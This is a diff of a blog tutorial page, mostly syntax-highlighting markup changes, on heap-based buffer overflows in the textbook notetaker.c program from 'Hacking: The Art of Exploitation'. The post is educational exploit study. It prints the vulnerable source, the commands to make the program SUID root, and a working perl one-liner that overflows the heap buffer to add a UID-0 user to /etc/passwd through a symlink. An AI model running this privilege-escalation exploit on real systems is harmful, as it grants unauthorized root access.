@@ -7,6 +7,9 @@
 <title>Heap-based buffer overflows | danielorihuela</title>
 <link rel=stylesheet href=/css/page.css>
 <script type=module src=/js/frame/index.js></script>
+<link rel=stylesheet href=/css/code.css>
+<script src=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js></script>
+<script>hljs.highlightAll()</script>
 </head>
 <body>
 <span class=title>
@@ -30,12 +33,12 @@ Back
 <p>In a previous post, I explained what a <a href=https://danielorihuela.github.io/posts/stack-based-buffer-overflows/>stack-based buffer overflow</a> is and how it works. Today, we are going to see the heap-based variant.</p>
 <h2 id=stack-vs-heap-based-buffer-overflows>Stack vs Heap-based buffer overflows?</h2>
 <p>The difference between those two types is the region of memory where the exploited variables reside. That&rsquo;s easy to see in the C language. All variables are stored in the stack unless we use functions to allocate memory in the heap.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C>  <span style=color:#75715e># Variables stored in the stack
-</span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> auth_flag <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-  <span style=color:#66d9ef>char</span> password_buffer[<span style=color:#ae81ff>16</span>];
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C>  <span class=cp># Variables stored in the stack
+</span><span class=cp></span>  <span class=kt>int</span> <span class=n>auth_flag</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+  <span class=kt>char</span> <span class=n>password_buffer</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span>
 
-  <span style=color:#75715e># Variables stored in the heap
-</span><span style=color:#75715e></span>  buffer <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)ec_malloc(<span style=color:#ae81ff>100</span>);
+  <span class=cp># Variables stored in the heap
+</span><span class=cp></span>  <span class=n>buffer</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>ec_malloc</span><span class=p>(</span><span class=mi>100</span><span class=p>);</span>
 </code></pre></div><h2 id=system-information>System information</h2>
 <p>Before starting, let me mention some information about my system. Take them into account if you try to replicate the results. They may vary from machine to machine.</p>
 <ul>
@@ -46,73 +49,73 @@ Back
 </ul>
 <h2 id=exercise>Exercise</h2>
 <p>We are going to exploit the <code>notetaker.c</code> program from <strong>Hacking: The Art of Exploitation, 2nd Edition</strong>. You can get the source code at <a href=https://github.com/intere/hacking/blob/master/booksrc>https://github.com/intere/hacking/blob/master/booksrc</a>. The program creates notes in <code>/var/notes</code>. Creating and modifying files in the root path requires root permissions. Hence, the executable of this program must be owned by the root and have the SUID activated. That way, we can execute it with normal users as if they were root.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C>  <span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
-</span><span style=color:#75715e></span>  <span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
-</span><span style=color:#75715e></span>  <span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
-</span><span style=color:#75715e></span>  <span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
-</span><span style=color:#75715e></span>  <span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/stat.h&gt;</span><span style=color:#75715e>
-</span><span style=color:#75715e></span>  <span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;hacking.h&#34;</span><span style=color:#75715e>
-</span><span style=color:#75715e></span>
-  <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>usage</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>prog_name, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>filename)
-  {
-    printf(<span style=color:#e6db74>&#34;Usage: %s &lt;data to add to %s&gt;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, prog_name, filename);
-    exit(<span style=color:#ae81ff>0</span>);
-  }
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C>  <span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span><span class=cp></span>  <span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
+</span><span class=cp></span>  <span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
+</span><span class=cp></span>  <span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
+</span><span class=cp></span>  <span class=cp>#include</span> <span class=cpf>&lt;sys/stat.h&gt;</span><span class=cp>
+</span><span class=cp></span>  <span class=cp>#include</span> <span class=cpf>&#34;hacking.h&#34;</span><span class=cp>
+</span><span class=cp></span>
+  <span class=kt>void</span> <span class=nf>usage</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>prog_name</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>filename</span><span class=p>)</span>
+  <span class=p>{</span>
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Usage: %s &lt;data to add to %s&gt;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>prog_name</span><span class=p>,</span> <span class=n>filename</span><span class=p>);</span>
+    <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+  <span class=p>}</span>
 
-  <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>fatal</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>);            <span style=color:#75715e>// A function for fatal errors
-</span><span style=color:#75715e></span>  <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>ec_malloc</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>); <span style=color:#75715e>// An error-checked malloc() wrapper
-</span><span style=color:#75715e></span>
-  <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>argv[])
-  {
-    <span style=color:#66d9ef>int</span> userid, fd; <span style=color:#75715e>// File descriptor
-</span><span style=color:#75715e></span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>buffer, <span style=color:#f92672>*</span>datafile;
+  <span class=kt>void</span> <span class=nf>fatal</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>);</span>            <span class=c1>// A function for fatal errors
+</span><span class=c1></span>  <span class=kt>void</span> <span class=o>*</span><span class=nf>ec_malloc</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>);</span> <span class=c1>// An error-checked malloc() wrapper
+</span><span class=c1></span>
+  <span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span>
+  <span class=p>{</span>
+    <span class=kt>int</span> <span class=n>userid</span><span class=p>,</span> <span class=n>fd</span><span class=p>;</span> <span class=c1>// File descriptor
+</span><span class=c1></span>    <span class=kt>char</span> <span class=o>*</span><span class=n>buffer</span><span class=p>,</span> <span class=o>*</span><span class=n>datafile</span><span class=p>;</span>
 
-    buffer <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)ec_malloc(<span style=color:#ae81ff>100</span>);
-    datafile <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)ec_malloc(<span style=color:#ae81ff>20</span>);
-    strcpy(datafile, <span style=color:#e6db74>&#34;/var/notes&#34;</span>);
+    <span class=n>buffer</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>ec_malloc</span><span class=p>(</span><span class=mi>100</span><span class=p>);</span>
+    <span class=n>datafile</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>ec_malloc</span><span class=p>(</span><span class=mi>20</span><span class=p>);</span>
+    <span class=n>strcpy</span><span class=p>(</span><span class=n>datafile</span><span class=p>,</span> <span class=s>&#34;/var/notes&#34;</span><span class=p>);</span>
 
-    <span style=color:#66d9ef>if</span> (argc <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2</span>)                 <span style=color:#75715e>// If there aren&#39;t command-line arguments,
-</span><span style=color:#75715e></span>      usage(argv[<span style=color:#ae81ff>0</span>], datafile); <span style=color:#75715e>// display usage message and exit.
-</span><span style=color:#75715e></span>
-    strcpy(buffer, argv[<span style=color:#ae81ff>1</span>]); <span style=color:#75715e>// Copy into buffer.
-</span><span style=color:#75715e></span>
-    printf(<span style=color:#e6db74>&#34;[DEBUG] buffer @ %p: </span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#39;\n</span><span style=color:#e6db74>&#34;</span>, buffer, buffer);
-    printf(<span style=color:#e6db74>&#34;[DEBUG] datafile @ %p: </span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#39;\n</span><span style=color:#e6db74>&#34;</span>, datafile, datafile);
+    <span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>&lt;</span> <span class=mi>2</span><span class=p>)</span>                 <span class=c1>// If there aren&#39;t command-line arguments,
+</span><span class=c1></span>      <span class=n>usage</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>datafile</span><span class=p>);</span> <span class=c1>// display usage message and exit.
+</span><span class=c1></span>
+    <span class=n>strcpy</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span> <span class=c1>// Copy into buffer.
+</span><span class=c1></span>
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;[DEBUG] buffer @ %p: </span><span class=se>\&#39;</span><span class=s>%s</span><span class=se>\&#39;\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>buffer</span><span class=p>,</span> <span class=n>buffer</span><span class=p>);</span>
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;[DEBUG] datafile @ %p: </span><span class=se>\&#39;</span><span class=s>%s</span><span class=se>\&#39;\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>datafile</span><span class=p>,</span> <span class=n>datafile</span><span class=p>);</span>
 
-    <span style=color:#75715e>// Opening the file
-</span><span style=color:#75715e></span>    fd <span style=color:#f92672>=</span> open(datafile, O_WRONLY <span style=color:#f92672>|</span> O_CREAT <span style=color:#f92672>|</span> O_APPEND, S_IRUSR <span style=color:#f92672>|</span> S_IWUSR);
-    <span style=color:#66d9ef>if</span> (fd <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)
-      fatal(<span style=color:#e6db74>&#34;in main() while opening file&#34;</span>);
-    printf(<span style=color:#e6db74>&#34;[DEBUG] file descriptor is %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, fd);
+    <span class=c1>// Opening the file
+</span><span class=c1></span>    <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=n>datafile</span><span class=p>,</span> <span class=n>O_WRONLY</span> <span class=o>|</span> <span class=n>O_CREAT</span> <span class=o>|</span> <span class=n>O_APPEND</span><span class=p>,</span> <span class=n>S_IRUSR</span> <span class=o>|</span> <span class=n>S_IWUSR</span><span class=p>);</span>
+    <span class=k>if</span> <span class=p>(</span><span class=n>fd</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span>
+      <span class=n>fatal</span><span class=p>(</span><span class=s>&#34;in main() while opening file&#34;</span><span class=p>);</span>
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;[DEBUG] file descriptor is %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>fd</span><span class=p>);</span>
 
-    userid <span style=color:#f92672>=</span> getuid(); <span style=color:#75715e>// Get the real user ID.
-</span><span style=color:#75715e></span>
-    <span style=color:#75715e>// Writing data
-</span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (write(fd, <span style=color:#f92672>&amp;</span>userid, <span style=color:#ae81ff>4</span>) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) <span style=color:#75715e>// Write user ID before note data.
-</span><span style=color:#75715e></span>      fatal(<span style=color:#e6db74>&#34;in main() while writing userid to file&#34;</span>);
-    write(fd, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>1</span>);                          <span style=color:#75715e>// Terminate line.
-</span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (write(fd, buffer, strlen(buffer)) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) <span style=color:#75715e>// Write note.
-</span><span style=color:#75715e></span>      fatal(<span style=color:#e6db74>&#34;in main() while writing buffer to file&#34;</span>);
+    <span class=n>userid</span> <span class=o>=</span> <span class=n>getuid</span><span class=p>();</span> <span class=c1>// Get the real user ID.
+</span><span class=c1></span>
+    <span class=c1>// Writing data
+</span><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=n>write</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>userid</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=c1>// Write user ID before note data.
+</span><span class=c1></span>      <span class=n>fatal</span><span class=p>(</span><span class=s>&#34;in main() while writing userid to file&#34;</span><span class=p>);</span>
+    <span class=n>write</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>                          <span class=c1>// Terminate line.
+</span><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=n>write</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buffer</span><span class=p>,</span> <span class=n>strlen</span><span class=p>(</span><span class=n>buffer</span><span class=p>))</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=c1>// Write note.
+</span><span class=c1></span>      <span class=n>fatal</span><span class=p>(</span><span class=s>&#34;in main() while writing buffer to file&#34;</span><span class=p>);</span>
 
-    write(fd, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>1</span>); <span style=color:#75715e>// Terminate line.
-</span><span style=color:#75715e></span>    <span style=color:#75715e>// Closing file
-</span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (close(fd) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)
-      fatal(<span style=color:#e6db74>&#34;in main() while closing file&#34;</span>);
-    printf(<span style=color:#e6db74>&#34;Note has been saved.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
-    free(buffer);
-    free(datafile);
-  }
+    <span class=n>write</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span> <span class=c1>// Terminate line.
+</span><span class=c1></span>    <span class=c1>// Closing file
+</span><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=n>close</span><span class=p>(</span><span class=n>fd</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span>
+      <span class=n>fatal</span><span class=p>(</span><span class=s>&#34;in main() while closing file&#34;</span><span class=p>);</span>
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Note has been saved.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+    <span class=n>free</span><span class=p>(</span><span class=n>buffer</span><span class=p>);</span>
+    <span class=n>free</span><span class=p>(</span><span class=n>datafile</span><span class=p>);</span>
+  <span class=p>}</span>
 </code></pre></div><p>The error is copying the data from <code>argv[1]</code> to the buffer without checking the length. We can overflow the <code>buffer</code> variable if we pass a long enough argument to the executable and overwrite the <code>datafile</code> data.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C>  buffer <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)ec_malloc(<span style=color:#ae81ff>100</span>);
-  datafile <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)ec_malloc(<span style=color:#ae81ff>20</span>);
-  strcpy(datafile, <span style=color:#e6db74>&#34;/var/notes&#34;</span>);
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C>  <span class=n>buffer</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>ec_malloc</span><span class=p>(</span><span class=mi>100</span><span class=p>);</span>
+  <span class=n>datafile</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>ec_malloc</span><span class=p>(</span><span class=mi>20</span><span class=p>);</span>
+  <span class=n>strcpy</span><span class=p>(</span><span class=n>datafile</span><span class=p>,</span> <span class=s>&#34;/var/notes&#34;</span><span class=p>);</span>
 
-  <span style=color:#66d9ef>if</span> (argc <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2</span>)                 <span style=color:#75715e>// If there aren&#39;t command-line arguments,
-</span><span style=color:#75715e></span>    usage(argv[<span style=color:#ae81ff>0</span>], datafile); <span style=color:#75715e>// display usage message and exit.
-</span><span style=color:#75715e></span>
-  strcpy(buffer, argv[<span style=color:#ae81ff>1</span>]); <span style=color:#75715e>// Copy into buffer.
+  <span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>&lt;</span> <span class=mi>2</span><span class=p>)</span>                 <span class=c1>// If there aren&#39;t command-line arguments,
+</span><span class=c1></span>    <span class=n>usage</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>datafile</span><span class=p>);</span> <span class=c1>// display usage message and exit.
+</span><span class=c1></span>
+  <span class=n>strcpy</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span> <span class=c1>// Copy into buffer.
 </span></code></pre></div><p>Let&rsquo;s compile the program and give it the proper permissions.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>  gcc notetaker.c -o notetaker -g
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>  gcc notetaker.c -o notetaker -g
   sudo chown root:root notetaker
   sudo chmod u+s notetaker
 </code></pre></div><p>We can write to whatever file we want, <code>testfile</code> for example.</p>
@@ -123,12 +126,12 @@ Back
 <p>The exercise is helpful but dull. We can do something more interesting when exploiting that program. We can create a new root user with any password that we want. Let me show you.</p>
 <p>In Linux, there’s the /etc/passwd file where the basic information related to users is stored. Each entry includes the login name, hashed password, user id, group id, username, home directory and login shell of a user, separated by colons (e.g. <code>root:x:0:0:root:/root:/bin/bash</code>). We can add a manually prepared entry to <code>/etc/passwd</code>, but how do we create the hashed password?</p>
 <p>There are plenty of hashing functions. There&rsquo;s no constraint in linux, so we can use whichever one we want. I decided to use <code>crypt</code> from perl with a simple password (1234) and salt (AA).</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>  perl -e <span style=color:#e6db74>&#39;print crypt(&#34;1234&#34;, &#34;AA&#34;), &#34;\n&#34;&#39;</span>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>  perl -e <span class=s1>&#39;print crypt(&#34;1234&#34;, &#34;AA&#34;), &#34;\n&#34;&#39;</span>
 </code></pre></div><p>The result is <code>AA3BKXQMdIWHE</code>. The entry would then look like <code>newrootuser:AA3BKXQMdIWHE:0:0:root:/root:/bin/bash</code>. There&rsquo;s still another problem to solve. Remember that for the exploit to work, the final part of the argument must be the file where we want to write the data. It should be something similar to <code>newrootuser:AA3BKXQMdIWHE:0:0:root:/root:/etc/passwd</code>. However, this is not a valid entry. The last part is no longer a shell, but a file. We can sidestep this problem with a symbolic link. That&rsquo;s the cool part, pay attention.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>  mkdir /tmp/etc
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>  mkdir /tmp/etc
   ln -s /bin/bash /tmp/etc/passwd
 </code></pre></div><p>We just created a symbolic link in <code>/tmp/etc/passwd</code> to a shell. That way, we can create a payload that ends with a login shell and the filename we want to overwrite. Pretty slick, right? We can then rewrite the entry as <code>newrootuser:AA3BKXQMdIWHE:0:0:root:/root:/tmp/etc/passwd</code>. The last step is to make it longer to overflow the buffer.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>  ./notetaker <span style=color:#66d9ef>$(</span>perl -e <span style=color:#e6db74>&#39;print &#34;newrootuser:AA3BKXQMdIWHE:0:0:&#34;, &#34;A&#34; x 71, &#34;:/root:/tmp/etc/passwd&#34;&#39;</span><span style=color:#66d9ef>)</span>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>  ./notetaker <span class=k>$(</span>perl -e <span class=s1>&#39;print &#34;newrootuser:AA3BKXQMdIWHE:0:0:&#34;, &#34;A&#34; x 71, &#34;:/root:/tmp/etc/passwd&#34;&#39;</span><span class=k>)</span>
 </code></pre></div><figure class=centered-image><img src=/images/heap-based-buffer-overflow/root-access.png>
 </figure>
 <h2 id=conclusion>Conclusion</h2>
